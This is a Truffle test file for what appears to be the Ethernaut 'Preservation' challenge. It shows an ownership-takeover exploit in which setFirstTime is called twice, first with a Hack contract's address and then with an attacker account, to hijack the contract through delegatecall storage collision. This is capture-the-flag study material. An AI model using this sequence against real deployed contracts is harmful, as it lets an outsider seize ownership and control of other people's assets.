const LibraryContract = artifacts.require('LibraryContract');
const Preservation = artifacts.require('Preservation');
const Hack = artifacts.require('Hack');

contract('Preservation', (accounts) => {

    let librarycontract, hack, preservation;

    beforeEach( async () => {
       librarycontract = await LibraryContract.deployed();
       hack = await Hack.deployed();
       preservation = await Preservation.deployed();

    })

    it('test first settime call', async () => {
        let addhack = hack.address;
        
        //await preservation.setFirstTime(hack.address, {from: accounts[1]});
        assert.equal(hack.address, await preservation.timeZone1Library.call());
        //console.log(await preservation.timeZone1Library.call());
    })

    it('test hacking by calling hack function', async () => {
        await preservation.setFirstTime(hack.address, {from: accounts[1]});
        await preservation.setFirstTime(accounts[3], {from: accounts[3]});
        assert.equal(accounts[3], await preservation.owner.call());
    })
})